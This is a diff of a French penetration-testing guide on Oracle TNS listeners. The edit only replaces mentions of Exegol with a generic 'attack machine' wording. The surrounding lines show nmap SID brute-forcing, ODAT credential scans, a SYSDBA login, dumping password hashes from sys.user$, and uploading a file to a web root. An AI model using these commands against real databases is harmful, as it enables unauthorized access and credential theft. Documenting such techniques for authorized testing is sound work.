@@ -82,7 +82,7 @@ La gestion à distance du listener était activée par défaut sur Oracle 8i et 
 ### Découverte du service
 
 ```bash
-# Depuis Exegol - identifier le listener Oracle
+# Depuis votre machine d'attaque - identifier le listener Oracle
 sudo nmap -p1521 -sV <IP_CIBLE> --open
 ```
 
@@ -100,7 +100,7 @@ Le terme `unauthorized` signifie que le listener ne donne pas d'information comp
 Le SID (System Identifier) est nécessaire pour se connecter à une instance. Si on ne le connait pas, on peut tenter de le deviner par brute-force :
 
 ```bash
-# Depuis Exegol - brute-force des SID via Nmap
+# Depuis votre machine d'attaque - brute-force des SID via Nmap
 sudo nmap -p1521 -sV <IP_CIBLE> --script oracle-sid-brute
 ```
 
@@ -111,14 +111,14 @@ Les SID courants (`XE`, `ORCL`, `PROD`, `TEST`, `DEV`) sont souvent les premiers
 ODAT (Oracle Database Attacking Tool) est un outil Python dédié à l'audit des bases Oracle. Il teste automatiquement les comptes par défaut, les privilèges, les possibilités d'upload de fichiers et bien plus.
 
 ```bash
-# Depuis Exegol - scan complet de l'instance
+# Depuis votre machine d'attaque - scan complet de l'instance
 odat all -s <IP_CIBLE>
 ```
 
 ODAT va tester les combinaisons de credentials courantes et remonter les comptes valides avec leurs privilèges.
 
 {% hint style="warning" %}
-L'installation d'ODAT nécessite les bibliothèques Oracle Instant Client. Sur Exegol, elles sont généralement pré-installées. En dehors de cet environnement, il faut installer `instantclient-basic` et `instantclient-sqlplus`, puis configurer la variable `LD_LIBRARY_PATH`.
+L'installation d'ODAT nécessite les bibliothèques Oracle Instant Client. Sur la plupart des distributions offensives, elles sont généralement pré-installées. En dehors de cet environnement, il faut installer `instantclient-basic` et `instantclient-sqlplus`, puis configurer la variable `LD_LIBRARY_PATH`.
 {% endhint %}
 
 ### Connexion avec SQLPlus
@@ -126,7 +126,7 @@ L'installation d'ODAT nécessite les bibliothèques Oracle Instant Client. Sur E
 Une fois des credentials obtenus, on se connecte directement :
 
 ```bash
-# Depuis Exegol - connexion standard
+# Depuis votre machine d'attaque - connexion standard
 sqlplus <utilisateur>/<motdepasse>@<IP_CIBLE>/XE
 ```
 
@@ -143,7 +143,7 @@ select * from user_role_privs;
 Si le compte dispose du rôle `SYSDBA`, on peut élever la connexion :
 
 ```bash
-# Depuis Exegol - connexion en tant que SYSDBA
+# Depuis votre machine d'attaque - connexion en tant que SYSDBA
 sqlplus <utilisateur>/<motdepasse>@<IP_CIBLE>/XE as sysdba
 ```
 
@@ -159,7 +159,7 @@ select name, password from sys.user$;
 Si le compte dispose de droits suffisants (SYSDBA ou privilège `UTL_FILE`), ODAT permet de déposer un fichier sur le serveur :
 
 ```bash
-# Depuis Exegol - upload d'un fichier sur le serveur web
+# Depuis votre machine d'attaque - upload d'un fichier sur le serveur web
 echo "test" > payload.txt
 odat utlfile -s <IP_CIBLE> -d XE -U <utilisateur> -P <motdepasse> --sysdba --putFile /var/www/html payload.txt ./payload.txt
 ```
